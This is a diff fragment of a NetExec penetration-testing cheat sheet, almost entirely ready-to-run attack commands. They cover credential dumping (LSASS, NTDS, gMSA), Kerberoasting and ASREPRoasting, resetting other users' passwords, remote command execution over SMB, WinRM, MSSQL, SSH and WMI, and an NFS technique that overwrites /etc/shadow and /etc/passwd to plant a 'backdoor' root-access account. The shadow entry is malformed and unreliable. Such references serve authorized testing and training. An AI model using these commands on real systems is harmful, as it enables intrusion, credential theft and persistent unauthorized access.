+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nanodump
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ntdsutil
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M putty
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M vnc
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mremoteng
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad++
+```
+
+###### Timeroasting
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M timeroast
+```
+
+###### User Handling
+
+###### Change User Password
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M change-password -o NEWPASS=<PASSWORD>
+```
+
+###### Change Password of a different User
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M change-password -o USER=<USERNAME> NEWPASS=<PASSWORD>
+```
+
+###### Command Execution
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x <COMMAND>
+netexec smb <RHOST> -u '<USERNAME>' -M pi -o PID=<PID> EXEC=<COMMAND>
+```
+
+##### LDAP
+
+###### Domain Enumeration
+
+```shell
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users-export <FILE>
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --active-users
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups "<GROUP>"
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --admin-count
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query "(adminCount=1)" "sAMAccountName"
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dc-list
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M pre2k
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M maq
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_trusts
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ldap-checker
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M whoami
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M sccm -o REC_RESOLVE=TRUE
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound --dns-tcp --dns-server <RHOST> -c All
+```
+
+###### Find Domain SID
+
+```shell
+netexec ldap <RHOST> -u '<USERNAME>' -k --get-sid
+```
+
+###### Forest Trust Enumeration
+
+```shell
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=trustedDomain)(trustPartner=<DOMAIN>))' 'distinguishedName trustPartner trustDirection trustType trustAttributes securityIdentifier'
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=trustedDomain)(trustPartner=<DOMAIN>))' 'distinguishedName trustPartner trustDirection trustType trustAttributes securityIdentifier'
+```
+
+```python
+python3 -c 'v=72; print(f"{v} = {v:#x}"); print([name for bit,name in [(0x1,"NON_TRANSITIVE"),(0x2,"UPLEVEL_ONLY"),(0x4,"QUARANTINED"),(0x8,"FOREST_TRANSITIVE"),(0x10,"CROSS_ORGANIZATION"),(0x20,"WITHIN_FOREST"),(0x40,"TREAT_AS_EXTERNAL"),(0x400,"PIM_TRUST")] if v & bit])'
+```
+
+```shell
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=group)(objectSid=*))' 'sAMAccountName objectSid memberOf'
+```
+
+###### LDAP Queries
+
+```shell
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query '(sAMAccountName=Administrator)' ''
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query '(sAMAccountName=Administrator)' 'sAMAccountName objectClass pwdLastSet'
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <RHOST> --query '(&(objectClass=organizationalUnit)(ou=<OU>))' 'distinguishedName objectGUID'
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <RHOST> --query '(sAMAccountName=<GROUP>)' 'distinguishedName objectSid member'
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <RHOST> --query '(sAMAccountName=<USERNAME>)' 'distinguishedName objectSid memberOf'
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M daclread -o TARGET_DN='OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' ACTION=read PRINCIPAL=<GROUP>
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M daclread -o TARGET_DN='OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' ACTION=read PRINCIPAL=<USERNAME>
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query '(&(objectClass=user)(sAMAccountName=<USERNAME>))' 'distinguishedName sAMAccountName userPrincipalName userAccountControl pwdLastSet'
+```
+
+###### Domain Access Control List (DACL) Enumeration
+
+```shell
+netexec ldap -k --kdcHost <RHOST> -M daclread -o TARGET=Administrator ACTION=read
+netexec ldap -k --kdcHost <RHOST> -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=<USERNAME>
+netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET_DN="DC=<DOMAIN>,DC=<DOMAIN>" ACTION=read RIGHTS=DCSync
+netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied
+netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET=../../<FILE> ACTION=backup
+```
+
+###### Credentials Dumping
+
+```shell
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
+```
+
+###### ASREPRoast
+
+```shell
+netexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.asreproast
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
+netexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.asreproast --kdcHost <DOMAIN>
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast --kdcHost <DOMAIN>
+```
+
+###### Kerberoasting
+
+```shell
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
+```
+
+###### Delegation
+
+###### Find Delegation
+
+```shell
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
+```
+
+###### Find Unconstrained Delegation
+
+```shell
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --trusted-for-delegation
+```
+
+###### Active Directory Certificate Services (AD CS)
+
+###### ESC8: NTLM Relay to AD CS HTTP Endpoints
+
+```shell
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs -o SERVER=<RHOST>
+```
+
+##### WinRM
+
+###### Command Execution
+
+```shell
+netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -X <COMMAND>
+```
+
+##### MSSQL
+
+###### RID Brute Force
+
+```shell
+netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --rid-brute
+```
+
+###### Privilege Escalation
+
+```shell
+netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv
+netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv -o ACTION=privesc
+netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv -o ACTION=rollback
+```
+
+###### Command Execution
+
+```shell
+netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth -x whoami
+netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+```
+
+###### File Handling
+
+```shell
+netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\PATH\\TO\FOLDER\\<FILE> /PATH/TO/FOLDER/<FILE>
+netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /PATH/TO/FILE/<FILE> \\PATH\\TO\FOLDER\\<FILE>
+```
+
+##### SSH
+
+###### Command Execution
+
+```shell
+netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x <COMMAND>
+```
+
+###### File Handling
+
+```shell
+netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file /PATH/TO/FOLDER/<FILE> <FILE>
+netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE> /PATH/TO/FOLDER/<FILE>
+```
+
+##### FTP
+
+###### File Handling
+
+```shell
+netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ls
+netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file <FILE>
+netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE> <FILE>
+```
+
+##### RDP
+
+###### Take Screenshot
+
+```shell
+netexec rdp <RHOST> --nla-screenshot
+netexec rdp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --screenshot --screentime 3
+```
+
+##### WMI
+
+###### Command Execution
+
+```shell
+netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x <COMMAND>
+```
+
+##### NFS
+
+###### Share Enumeration
+
+```shell
+netexec nfs <RHOST>
+netexec nfs <RHOST> --shares
+netexec nfs <RHOST> --enum-shares
+netexec nfs <RHOST> --share '/var/nfs/general' --ls '/'
+```
+
+####### File Handling
+
+```shell
+netexec nfs <RHOST> --get-file /PATH/TO/FOLDER/<FILE> <FILE>
+netexec nfs <RHOST> --put-file <FILE> /PATH/TO/FOLDER/<FILE>
+```
+
+###### Escape to root File System
+
+| Username | Password |
+| --- | --- |
+| backdoor | P@ssword123! |
+
+```shell
+netexec nfs <RHOST> --ls '/'
+netexec nfs <RHOST> --get-file '/etc/shadow' etc_shadow
+netexec nfs <RHOST> --get-file '/etc/passwd' etc_passwd
+echo 'backdoor$6$QF0YMBn9$Gj7DTxYtq7ie3zTOSSHrFsp2DpWqTpV0xunqkGxU7UlK8tZkW6zzFNRy8GwsVqYFxflK0zPbAAKQt6VwAhWqsyO:18000:0:99999:7:::' >> etc_shadow
+echo 'backdoor:x:1003:1001:,,,:/home/backdoor:/bin/bash' >> etc_passwd
+netexec nfs <RHOST> --put-file etc_shadow '/etc/shadow'
+netexec nfs <RHOST> --put-file etc_passwd '/etc/passwd'
+ssh backdoor@<RHOST>
 ```
 
 #### NTLM
